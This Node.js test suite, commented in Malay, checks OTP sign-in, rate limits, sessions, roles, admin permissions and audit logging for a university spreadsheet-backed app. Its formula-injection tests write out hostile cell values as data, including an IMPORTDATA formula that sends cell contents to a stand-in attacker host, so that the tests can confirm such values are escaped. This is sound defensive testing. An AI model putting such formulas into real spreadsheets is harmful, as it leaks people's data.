'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { createEnv } = require('./gas-mock');

/** Persekitaran siap setup MOD UJI dengan penguji dalam senarai putih. */
function ready(mode, testers) {
  const env = createEnv();
  env.setup(mode || 'UJI');
  const list = testers || [
    'aina.contoh@graduate.utm.my', 'amirul.contoh@graduate.utm.my', 'weijie.contoh@graduate.utm.my',
    'staf1@utm.my', 'luar1@gmail.com', 'utmxcite@utm.my', 'pegawai@utm.my', 'pelajarx@graduate.utm.my'
  ];
  env.run(`(function(){ var r = Db.find('Tetapan', function(x){ return x.Kunci==='PENGUJI_EMEL'; })[0]; Db.update('Tetapan', r._row, {Nilai: ${JSON.stringify(list.join(','))}}); Cfg.invalidate(); })()`);
  return env;
}
const call = (env, method, token, payload) => env.plain(env.run(`rpc(${JSON.stringify(method)}, ${JSON.stringify(token)}, ${JSON.stringify(payload || {})})`));

/** Log masuk penuh: minta OTP, ambil kod daripada emel yang dihantar, sahkan. */
function login(env, email) {
  let r = call(env, 'otp.minta', null, { emel: email });
  assert.equal(r.ok, true, JSON.stringify(r));
  const code = env.lastCode(email);
  assert.match(code, /^\d{6}$/);
  r = call(env, 'otp.sahkan', null, { emel: email, kod: code });
  assert.equal(r.ok, true, JSON.stringify(r));
  return r.data;
}

test('OTP: emel dihantar dwibahasa, kod tidak disimpan sebagai teks biasa', () => {
  const env = ready();
  call(env, 'otp.minta', null, { emel: 'aina.contoh@graduate.utm.my' });
  const m = env.sentTo('aina.contoh@graduate.utm.my')[0];
  assert.match(m.subject, /^\[UJI\] Kod pengesahan log masuk \/ Sign-in verification code/);
  assert.match(m.htmlBody, /Kod pengesahan anda ialah: \d{6}/);
  assert.match(m.htmlBody, /Your verification code is: \d{6}/);
  // tiada kod dalam cache sebagai teks biasa
  const code = env.lastCode('aina.contoh@graduate.utm.my');
  const cacheDump = JSON.stringify(env.state.cache);
  assert.ok(!cacheDump.includes(code), 'kod OTP tidak boleh wujud dalam cache');
});

test('MOD UJI: emel di luar senarai penguji ditolak dan tiada emel dihantar', () => {
  const env = ready();
  const r = call(env, 'otp.minta', null, { emel: 'orang@gmail.com' });
  assert.equal(r.ok, false);
  assert.equal(r.error.code, 'UJI_TIADA_SENARAI');
  assert.equal(env.state.sent.length, 0);
});

test('MOD PRODUKSI: sebarang emel sah boleh menerima OTP', () => {
  const env = ready('PRODUKSI');
  const r = call(env, 'otp.minta', null, { emel: 'sesiapa@gmail.com' });
  assert.equal(r.ok, true);
  assert.equal(env.sentTo('sesiapa@gmail.com').length, 1);
  assert.ok(!env.sentTo('sesiapa@gmail.com')[0].subject.startsWith('[UJI]'));
});

test('emel tidak sah ditolak', () => {
  const env = ready();
  assert.equal(call(env, 'otp.minta', null, { emel: 'bukan-emel' }).error.code, 'EMEL_TIDAK_SAH');
  assert.equal(call(env, 'otp.minta', null, { emel: '' }).error.code, 'EMEL_TIDAK_SAH');
});

test('had kadar: jeda, sejam dan harian', () => {
  const env = ready();
  const e = 'aina.contoh@graduate.utm.my';
  assert.equal(call(env, 'otp.minta', null, { emel: e }).ok, true);
  assert.equal(call(env, 'otp.minta', null, { emel: e }).error.code, 'RATE_JEDA');
  env.advance(61);
  assert.equal(call(env, 'otp.minta', null, { emel: e }).ok, true);
  env.advance(61);
  assert.equal(call(env, 'otp.minta', null, { emel: e }).ok, true);
  env.advance(61);
  assert.equal(call(env, 'otp.minta', null, { emel: e }).error.code, 'RATE_SEJAM'); // maksimum 3 sejam
  env.advance(3600);
  assert.equal(call(env, 'otp.minta', null, { emel: e }).ok, true);

  // had harian global
  const env2 = ready();
  env2.run(`(function(){ var r = Db.find('Tetapan', function(x){ return x.Kunci==='OTP_MAKS_HARIAN'; })[0]; Db.update('Tetapan', r._row, {Nilai:'2'}); Cfg.invalidate(); })()`);
  assert.equal(call(env2, 'otp.minta', null, { emel: 'aina.contoh@graduate.utm.my' }).ok, true);
  assert.equal(call(env2, 'otp.minta', null, { emel: 'amirul.contoh@graduate.utm.my' }).ok, true);
  assert.equal(call(env2, 'otp.minta', null, { emel: 'weijie.contoh@graduate.utm.my' }).error.code, 'RATE_HARIAN');
});

test('OTP salah: ditolak, had percubaan, kod lama tidak sah selepas dikunci', () => {
  const env = ready();
  const e = 'aina.contoh@graduate.utm.my';
  call(env, 'otp.minta', null, { emel: e });
  const good = env.lastCode(e);
  const bad = good === '000000' ? '111111' : '000000';
  for (let i = 0; i < 4; i++) assert.equal(call(env, 'otp.sahkan', null, { emel: e, kod: bad }).error.code, 'OTP_SALAH');
  // percubaan ke-5 mengunci
  assert.equal(call(env, 'otp.sahkan', null, { emel: e, kod: bad }).error.code, 'OTP_TERLALU_BANYAK');
  // kod betul tidak lagi diterima selepas dikunci
  assert.equal(call(env, 'otp.sahkan', null, { emel: e, kod: good }).error.code, 'OTP_TAMAT');
});

test('OTP tamat tempoh selepas 5 minit', () => {
  const env = ready();
  const e = 'aina.contoh@graduate.utm.my';
  call(env, 'otp.minta', null, { emel: e });
  const code = env.lastCode(e);
  env.advance(5 * 60 + 1);
  assert.equal(call(env, 'otp.sahkan', null, { emel: e, kod: code }).error.code, 'OTP_TAMAT');
});

test('OTP sekali guna', () => {
  const env = ready();
  const e = 'aina.contoh@graduate.utm.my';
  call(env, 'otp.minta', null, { emel: e });
  const code = env.lastCode(e);
  assert.equal(call(env, 'otp.sahkan', null, { emel: e, kod: code }).ok, true);
  assert.equal(call(env, 'otp.sahkan', null, { emel: e, kod: code }).error.code, 'OTP_TAMAT');
});

test('OTP emel A tidak boleh digunakan untuk emel B', () => {
  const env = ready();
  call(env, 'otp.minta', null, { emel: 'aina.contoh@graduate.utm.my' });
  const code = env.lastCode('aina.contoh@graduate.utm.my');
  const r = call(env, 'otp.sahkan', null, { emel: 'amirul.contoh@graduate.utm.my', kod: code });
  assert.equal(r.ok, false);
});

test('sesi: token tidak sah ditolak; tamat selepas 6 jam; keluar membatalkan sesi', () => {
  const env = ready();
  const s = login(env, 'aina.contoh@graduate.utm.my');
  assert.equal(call(env, 'sesi.saya', 'bukan-token', {}).error.code, 'SESI_TAMAT');
  assert.equal(call(env, 'sesi.saya', null, {}).error.code, 'SESI_TAMAT');
  assert.equal(call(env, 'sesi.saya', s.token, {}).ok, true);
  call(env, 'sesi.keluar', s.token, {});
  assert.equal(call(env, 'sesi.saya', s.token, {}).error.code, 'SESI_TAMAT');
  const s2 = login(env, 'amirul.contoh@graduate.utm.my');
  env.advance(6 * 3600 + 1);
  assert.equal(call(env, 'sesi.saya', s2.token, {}).error.code, 'SESI_TAMAT');
});

test('peranan ditentukan daripada domain dan senarai admin', () => {
  const env = ready();
  assert.equal(login(env, 'aina.contoh@graduate.utm.my').session.role, 'Pelajar');
  assert.equal(login(env, 'staf1@utm.my').session.role, 'Staf');
  assert.equal(login(env, 'luar1@gmail.com').session.role, 'Luar');
  const a = login(env, 'utmxcite@utm.my').session;
  assert.equal(a.role, 'Admin Penuh');
  assert.equal(a.perlu, '');
});

test('admin utama kekal Admin Penuh walaupun barisnya dipadam dari tab Admin', () => {
  const env = ready();
  env.run("Db.replaceAll('Admin', []); Admins.invalidate();");
  assert.equal(login(env, 'utmxcite@utm.my').session.role, 'Admin Penuh');
});

// ---------- Pelajar: tuntut No. Matrik ----------

test('pelajar baharu diminta No. Matrik; selepas sah, profil diambil daripada PELAJAR', () => {
  const env = ready();
  const s = login(env, 'aina.contoh@graduate.utm.my');
  assert.equal(s.session.perlu, 'MATRIK');
  const r = call(env, 'daftar.matrik', s.token, { noMatrik: 'a23uj0001' });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.data.nama, 'NURUL AINA BINTI HASSAN');
  assert.equal(r.data.perlu, '');
  assert.equal(r.data.noMatrik, 'A23UJ0001');
  // log masuk seterusnya: tidak diminta lagi
  env.advance(61);
  const s2 = login(env, 'aina.contoh@graduate.utm.my');
  assert.equal(s2.session.perlu, '');
  assert.equal(env.plain(env.run("Db.rows('Pengguna').length")), 1);
});

test('No. Matrik tidak dijumpai ditolak dan dicatat dalam Audit', () => {
  const env = ready();
  const s = login(env, 'aina.contoh@graduate.utm.my');
  const r = call(env, 'daftar.matrik', s.token, { noMatrik: 'A99XX9999' });
  assert.equal(r.error.code, 'MATRIK_TIDAK_DITEMUI');
  assert.equal(call(env, 'daftar.matrik', s.token, { noMatrik: '??' }).error.code, 'MATRIK_TIDAK_SAH');
  const audit = env.plain(env.run("Db.rows('Audit').map(function(r){return r.Tindakan;})"));
  assert.ok(audit.includes('MATRIK_TIDAK_DITEMUI'));
});

test('emel tidak sepadan dengan No. Matrik (lajur Emel dalam PELAJAR) ditolak', () => {
  const env = ready();
  const s = login(env, 'amirul.contoh@graduate.utm.my');
  // amirul cuba menuntut matrik milik aina
  const r = call(env, 'daftar.matrik', s.token, { noMatrik: 'A23UJ0001' });
  assert.equal(r.error.code, 'EMEL_TIDAK_SEPADAN');
  const audit = env.plain(env.run("Db.rows('Audit').map(function(r){return r.Tindakan;})"));
  assert.ok(audit.includes('MATRIK_EMEL_TIDAK_SEPADAN'));
});

test('tanpa lajur Emel dalam PELAJAR: No. Matrik dikunci kepada emel pertama (Cara 2)', () => {
  const env = ready();
  env.run(`(function(){ var r = Db.find('PELAJAR', function(x){ return x.No_Matrik==='A21UJ0007'; })[0]; Db.update('PELAJAR', r._row, {Emel:''}); })()`);
  const a = login(env, 'pelajarx@graduate.utm.my');
  assert.equal(call(env, 'daftar.matrik', a.token, { noMatrik: 'A21UJ0007' }).ok, true);
  const b = login(env, 'weijie.contoh@graduate.utm.my');
  assert.equal(call(env, 'daftar.matrik', b.token, { noMatrik: 'A21UJ0007' }).error.code, 'MATRIK_DITUNTUT');
  const audit = env.plain(env.run("Db.rows('Audit').map(function(r){return r.Tindakan;})"));
  assert.ok(audit.includes('MATRIK_DITUNTUT'));
});

test('pelajar status tidak aktif tidak boleh mendaftar', () => {
  const env = ready();
  env.run(`(function(){ var r = Db.find('PELAJAR', function(x){ return x.No_Matrik==='A23UJ0001'; })[0]; Db.update('PELAJAR', r._row, {Status_Pelajar:'Tangguh'}); })()`);
  const s = login(env, 'aina.contoh@graduate.utm.my');
  assert.equal(call(env, 'daftar.matrik', s.token, { noMatrik: 'A23UJ0001' }).error.code, 'STATUS_TIDAK_AKTIF');
});

test('staf tidak boleh menuntut No. Matrik; pelajar tidak boleh mendaftar profil staf', () => {
  const env = ready();
  const staf = login(env, 'staf1@utm.my');
  assert.equal(call(env, 'daftar.matrik', staf.token, { noMatrik: 'A23UJ0001' }).error.code, 'TIADA_KEBENARIAN');
  const pel = login(env, 'aina.contoh@graduate.utm.my');
  assert.equal(call(env, 'daftar.profil', pel.token, { nama: 'x', telefon: '0123456789' }).error.code, 'TIADA_KEBENARIAN');
});

// ---------- Staf dan orang luar ----------

test('staf daftar sendiri pada kali pertama; maklumat wajib disemak', () => {
  const env = ready();
  const s = login(env, 'staf1@utm.my');
  assert.equal(s.session.perlu, 'PROFIL');
  assert.equal(call(env, 'daftar.profil', s.token, { nama: 'Dr. Faizal', telefon: '0123456789' }).error.code, 'MAKLUMAT_TIDAK_LENGKAP'); // tiada No. Staf/jabatan
  assert.equal(call(env, 'daftar.profil', s.token, { nama: 'Dr. Faizal', noStaf: 'S1234', jabatan: 'Fakulti Komputeran', telefon: 'abc' }).error.code, 'TELEFON_TIDAK_SAH');
  const r = call(env, 'daftar.profil', s.token, { nama: 'Dr. Faizal', noStaf: 'S1234', jabatan: 'Fakulti Komputeran', telefon: '012-3456789' });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.data.perlu, '');
  env.advance(61);
  assert.equal(login(env, 'staf1@utm.my').session.perlu, '');
});

test('orang luar daftar sendiri: No. KP/pasport wajib, organisasi pilihan', () => {
  const env = ready();
  const s = login(env, 'luar1@gmail.com');
  assert.equal(s.session.perlu, 'PROFIL');
  assert.equal(call(env, 'daftar.profil', s.token, { nama: 'Ali', telefon: '0123456789' }).error.code, 'MAKLUMAT_TIDAK_LENGKAP');
  const r = call(env, 'daftar.profil', s.token, { nama: 'Ali', noKp: '900101-01-1234', telefon: '0123456789' });
  assert.equal(r.ok, true, JSON.stringify(r));
  const row = env.plain(env.run("Db.rows('Pengguna').filter(function(r){return r.Emel==='luar1@gmail.com';})[0]"));
  assert.equal(row.Peranan, 'Luar');
  assert.equal(row.No_KP_Pasport, '900101-01-1234');
});

test('pengguna disekat tidak boleh log masuk atau meneruskan sesi sedia ada', () => {
  const env = ready();
  const s = login(env, 'staf1@utm.my');
  call(env, 'daftar.profil', s.token, { nama: 'Dr. F', noStaf: 'S1', jabatan: 'FC', telefon: '0123456789' });
  env.run(`(function(){ var r = Db.find('Pengguna', function(x){ return x.Emel==='staf1@utm.my'; })[0]; Db.update('Pengguna', r._row, {Status:'Disekat'}); })()`);
  assert.equal(call(env, 'sesi.saya', s.token, {}).ok, true, 'cache pengguna 60 saat: belum berkuat kuasa serta-merta');
  env.advance(61);
  assert.equal(call(env, 'sesi.saya', s.token, {}).error.code, 'AKAUN_DISEKAT');
  assert.equal(call(env, 'otp.minta', null, { emel: 'staf1@utm.my' }).error.code, 'AKAUN_DISEKAT');
});

// ---------- Kebenaran RPC dan pentadbir ----------

test('kaedah tidak wujud dan prototaip tidak boleh dipanggil', () => {
  const env = ready();
  assert.equal(call(env, 'tiada.kaedah', null, {}).error.code, 'KAEDAH_TIDAK_SAH');
  assert.equal(call(env, 'constructor', null, {}).error.code, 'KAEDAH_TIDAK_SAH');
  assert.equal(call(env, '__proto__', null, {}).error.code, 'KAEDAH_TIDAK_SAH');
});

test('pelajar, staf dan luar tidak boleh memanggil kaedah admin', () => {
  const env = ready();
  const a = login(env, 'aina.contoh@graduate.utm.my');
  const s = login(env, 'staf1@utm.my');
  const l = login(env, 'luar1@gmail.com');
  for (const t of [a, s, l]) {
    for (const m of ['admin.status', 'admin.senarai', 'admin.tambah', 'admin.aktif', 'admin.import']) {
      assert.equal(call(env, m, t.token, {}).error.code, 'TIADA_KEBENARIAN', m);
    }
  }
  const audit = env.plain(env.run("Db.rows('Audit').filter(function(r){return r.Tindakan==='TIADA_KEBENARIAN';}).length"));
  assert.ok(audit >= 15);
});

test('admin penuh menambah Pegawai Modul; Pegawai Modul hanya lihat status, bukan urus admin', () => {
  const env = ready();
  const adm = login(env, 'utmxcite@utm.my');
  let r = call(env, 'admin.tambah', adm.token, { emel: 'pegawai@utm.my', nama: 'Pegawai Makerspace', peranan: 'Pegawai Modul', modul: 'Makerspace' });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.data.length, 2);
  const p = login(env, 'pegawai@utm.my');
  assert.equal(p.session.role, 'Pegawai Modul');
  assert.equal(call(env, 'admin.status', p.token, {}).ok, true);
  assert.equal(call(env, 'admin.senarai', p.token, {}).error.code, 'TIADA_KEBENARIAN');
  assert.equal(call(env, 'admin.tambah', p.token, { emel: 'x@utm.my', nama: 'X', peranan: 'Admin Penuh' }).error.code, 'TIADA_KEBENARIAN');
  assert.equal(call(env, 'admin.import', p.token, { csv: 'a\n1' }).error.code, 'TIADA_KEBENARIAN');
});

test('tambah admin: domain staf, peranan sah, admin utama dikunci', () => {
  const env = ready();
  const adm = login(env, 'utmxcite@utm.my');
  assert.equal(call(env, 'admin.tambah', adm.token, { emel: 'pelajar@graduate.utm.my', nama: 'P', peranan: 'Pegawai Modul' }).error.code, 'ADMIN_DOMAIN');
  assert.equal(call(env, 'admin.tambah', adm.token, { emel: 'a@utm.my', nama: 'A', peranan: 'Superuser' }).error.code, 'ADMIN_PERANAN');
  assert.equal(call(env, 'admin.tambah', adm.token, { emel: 'a@utm.my', nama: '', peranan: 'Pemerhati' }).error.code, 'MAKLUMAT_TIDAK_LENGKAP');
  assert.equal(call(env, 'admin.tambah', adm.token, { emel: 'utmxcite@utm.my', nama: 'X', peranan: 'Pemerhati' }).error.code, 'ADMIN_DIKUNCI');
  assert.equal(call(env, 'admin.aktif', adm.token, { emel: 'utmxcite@utm.my', aktif: false }).error.code, 'ADMIN_DIKUNCI');
});

test('admin dinyahaktifkan: serta-merta hilang kuasa admin (sesi sedia ada)', () => {
  const env = ready();
  const adm = login(env, 'utmxcite@utm.my');
  call(env, 'admin.tambah', adm.token, { emel: 'pegawai@utm.my', nama: 'P', peranan: 'Pegawai Modul' });
  const p = login(env, 'pegawai@utm.my');
  assert.equal(call(env, 'admin.status', p.token, {}).ok, true);
  const r = call(env, 'admin.aktif', adm.token, { emel: 'pegawai@utm.my', aktif: false });
  assert.equal(r.ok, true);
  env.advance(61); // cache admin tamat
  assert.equal(call(env, 'admin.status', p.token, {}).error.code, 'TIADA_KEBENARIAN');
});

test('semua tindakan penting dicatat dalam Audit', () => {
  const env = ready();
  const adm = login(env, 'utmxcite@utm.my');
  call(env, 'admin.tambah', adm.token, { emel: 'pegawai@utm.my', nama: 'P', peranan: 'Pegawai Modul' });
  const acts = env.plain(env.run("Db.rows('Audit').map(function(r){return r.Tindakan;})"));
  assert.ok(acts.includes('LOG_MASUK'));
  assert.ok(acts.includes('TAMBAH_ADMIN'));
});

test('ralat dalaman tidak mendedahkan butiran kepada pengguna', () => {
  const env = ready();
  const adm = login(env, 'utmxcite@utm.my');
  env.run("Db.rows = function () { throw new Error('rahsia dalaman: kata laluan db'); };");
  const r = call(env, 'admin.status', adm.token, {});
  assert.equal(r.ok, false);
  assert.equal(r.error.code, 'RALAT_DALAMAN');
  assert.ok(!JSON.stringify(r).includes('rahsia'));
});

test('pengesahan nama staf dan input panjang dipotong', () => {
  const env = ready();
  const s = login(env, 'staf1@utm.my');
  const long = 'A'.repeat(500);
  call(env, 'daftar.profil', s.token, { nama: long, noStaf: 'S1', jabatan: long, telefon: '0123456789' });
  const row = env.plain(env.run("Db.rows('Pengguna').filter(function(r){return r.Emel==='staf1@utm.my';})[0]"));
  assert.equal(row.Nama.length, 120);
  assert.equal(row.Jabatan_Organisasi.length, 160);
});

const liveFormulas = (env) => {
  const out = [];
  [env.induk, ...Object.values(env.state.spreadsheets)].forEach((ss) => ss.getSheets().forEach((sh) => out.push(...sh.liveFormulas)));
  return out;
};

test('suntikan formula: input pengguna bermula dengan = + - @ disimpan sebagai teks (apostrof pelepas)', () => {
  const env = ready();
  const s = login(env, 'luar1@gmail.com');
  const evil = '=IMPORTDATA("http://jahat.example/?d="&A1)';
  const r = call(env, 'daftar.profil', s.token, { nama: evil, noKp: '+123456', jabatan: '@SUM(1)', telefon: '0123456789' });
  assert.equal(r.ok, true, JSON.stringify(r));
  // nilai asal kekal sama apabila dibaca semula, tetapi ditulis dengan pelepas
  const row = env.plain(env.run("Db.rows('Pengguna').filter(function(r){return r.Emel==='luar1@gmail.com';})[0]"));
  assert.equal(row.Nama, evil);
  assert.equal(row.No_KP_Pasport, '+123456');
  assert.equal(row.Jabatan_Organisasi, '@SUM(1)');
  const esc = env.induk.getSheetByName('Pengguna').escaped;
  assert.ok(esc.includes(evil) && esc.includes('+123456') && esc.includes('@SUM(1)'));
  assert.deepEqual(liveFormulas(env), [], 'tiada formula hidup ditulis');
  assert.equal(env.plain(env.run("Db.safeCell('Aina')")), 'Aina');
  assert.equal(env.plain(env.run("Db.safeCell(5)")), 5);
  assert.equal(env.plain(env.run("Db.safeCell(\"'x\")")), "''x");
});

test('suntikan formula melalui import CSV dan kemas kini baris juga dilindungi', () => {
  const env = createEnv();
  env.setup('PRODUKSI');
  const csv = 'No_Matrik,Nama_Penuh,Emel,No_KP_Pasport,Jantina,Etnik,Kewarganegaraan,Fakulti,Program,Tahun_Pengajian\n' +
    'A1000001,"=HYPERLINK(""http://x"")",a1@graduate.utm.my,010101010001,P,Melayu,Warganegara,Fakulti Komputeran,BSc,2';
  const r = env.plain(env.run(`PelajarImport.run({email:'utmxcite@utm.my', role:'Admin Penuh'}, ${JSON.stringify({ csv, dryRun: false })})`));
  assert.equal(r.ditulis, true, JSON.stringify(r.ralat));
  assert.deepEqual(liveFormulas(env), []);
  // import kedua (gabung) menulis semula baris sedia ada: masih selamat
  env.run(`PelajarImport.run({email:'utmxcite@utm.my', role:'Admin Penuh'}, ${JSON.stringify({ csv: csv.replace('BSc,2', 'BSc,3'), dryRun: false })})`);
  assert.deepEqual(liveFormulas(env), []);
  assert.match(env.plain(env.run("Db.rows('PELAJAR')[0].Nama_Penuh")), /^=HYPERLINK/);
});

test('data awal (Tetapan @graduate.utm.my dan lain-lain) kekal betul selepas pelepasan', () => {
  const env = ready();
  assert.equal(env.plain(env.run("Cfg.get('DOMAIN_PELAJAR')")), '@graduate.utm.my');
  assert.equal(env.plain(env.run("Cfg.get('DOMAIN_STAF')")), '@utm.my');
  assert.deepEqual(liveFormulas(env), []);
});
